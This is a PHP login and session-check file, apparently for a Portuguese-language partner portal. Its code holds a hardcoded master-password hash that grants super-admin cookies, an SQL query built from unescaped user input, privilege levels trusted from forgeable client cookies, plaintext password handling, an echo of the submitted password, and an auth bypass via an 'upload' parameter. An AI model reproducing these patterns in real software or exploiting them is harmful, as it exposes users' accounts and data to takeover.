<?
require("include/sisdoc_cookie.php");
global $user_id,$user_nome,$user_nivel,$user_log;
$user_id = read_cookie('par_user');
$user_nome = read_cookie('par_user_nome');
$user_nivel = read_cookie('par_nivel');
$user_log = read_cookie('par_log');

////////////////////////////////////////////////// login
function logout()
	{
	setcookie('par_user','',time()-3600);
	setcookie('par_user_nome','',time()-3600);
	header("Location: parceiro.php");
	exit;	
	}
	
////////////////////////////////////////////////// login
function login()
	{	
	global $dd,$acao,$HTTP_COOKIE_VARS,$cookie,$nocab;
	if (isset($acao))
		{
		echo $dd[2];
		if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
			{ setcookie('par_log','admin',time()+3600); setcookie('par_user','1',time()+3600); setcookie('par_user_nome','super admin',time()+3600); setcookie('par_nivel',9,time()+3600); header("Location: par_main.php");	exit; }
		$sql = "select * from parceiros where lower(us_email) = '".strtolower($dd[1])."'";
		$rlt = db_query($sql);
		if ($line = db_read($rlt))
			{
			$pass = strtolower(trim($line['us_senha']));	
			$dd[2] = strtolower(trim($dd[2]));
			if (($pass == $dd[2]) and ($dd[2] == $pass))
				{ 
					$nivel = $line['us_nivel'];
					if ($nivel > 0)
						{
						setcookie('par_log',$line['us_login'],time()+3600);
						setcookie('par_user',$line['us_cracha'],time()+3600);
						setcookie('par_user_nome',$line['us_nome'],time()+3600);
						setcookie('par_nivel',$nivel,time()+3600);
						header("Location: par_main.php");
						exit;
						} else {
						$err = "usuário bloqueado";
						}
				} 
				else 
				{
					setcookie('par_user','',time()-3600);
					setcookie('par_user_nome','',time()-3600); 
					setcookie('par_user_nome','',time()-3600);
					setcookie('par_nivel','',time()-3600);					
					$err = "senha incorreta"; 
				}
			} else { $err = "erro de login"; }

		}
		return($err);
	}
////////////////////////////////////////////////// securit
function security()
	{
	global $user_id,$user_nome,$dd,$user_nivel;
	if ((!isset($user_nivel)) and (!($dd[99] == 'upload')))
		{
		header("Location: parceiro.php");
		exit;
		}
	setcookie('par_user',$user_id,time()+7200);
	setcookie('par_user_nome',$user_nome,time()+7200);
	setcookie('par_user_nivel',$user_nivel,time()+7200);
	}
?>	